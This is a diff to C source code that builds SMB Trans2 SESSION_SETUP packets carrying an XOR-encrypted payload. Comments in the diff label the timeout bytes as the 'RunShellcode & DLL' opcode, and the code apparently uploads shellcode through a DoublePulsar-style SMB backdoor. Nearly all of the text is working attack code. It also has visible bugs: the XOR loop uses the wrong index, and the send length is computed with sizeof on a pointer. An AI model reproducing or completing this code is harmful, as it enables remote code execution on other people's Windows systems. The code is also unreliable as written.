@@ -242,11 +242,14 @@ int main(int argc, char* argv[])
 		encrypted[i] = payload.lpbData[i]^XorKey;
         }
 
-	//build packet buffer, fill it with 0x00s and XOR it with the calculated key
-	char *big_packet = (unsigned char*)malloc(4096+1);
-	memset(big_packet, 0x00, 4096);
+	//build packet buffer with 4178 bytes in length
+	//82 bytes for the Trans2 Session Setup packet header
+	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
+	//Then fill the packet with 0x00s and XOR it with the calculated key
+	char *big_packet = (unsigned char*)malloc(4178+1);
+	memset(big_packet, 0x00, 4178);
 	int bp;
-	for(bp=0;bp<4096;bp++)
+	for(bp=0;bp<4178;bp++)
 	{
 		big_packet[i] = big_packet[i]^XorKey;
         }
@@ -264,8 +267,24 @@ int main(int argc, char* argv[])
 	{
 		if (bytesLeft < 4096)
 		{
+			//copy trans2 header to big packet
+			memcpy(big_packet, trans2_request, sizeof(trans2_request));
+
+			//update TreeId, UserID, ProcessID & MultiplexID in packet
+			memcpy(big_packet + 28, (char*)&treeid, 2);
+			memcpy(big_packet + 30, (char*)&processid, 2);
+			memcpy(big_packet + 32, (char*)&userid, 2);
+			big_packet[34] = '\x41';
+
+			//update Timeout for RunShellcode
+			//25 89 1a 00 is the opcode for RunShellcode & DLL
+			big_packet[49] = '\x25';
+			big_packet[50] = '\x89';
+			big_packet[51] = '\x1a';
+			big_packet[52] = '\x00';
+			
 			printf("Bytes left is less than 4096!...Generating smaller packet!\n");
-			memcpy((unsigned char*)big_packet, (unsigned char*)encrypted + ctx, bytesLeft);
+			memcpy(big_packet +  sizeof(trans2_request), (unsigned char*)encrypted + ctx, bytesLeft);
 			//send(s, (char*)Trans2SESSION, 4178, 0);
 			//send(s, &buf, 4178, 0);
 			send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
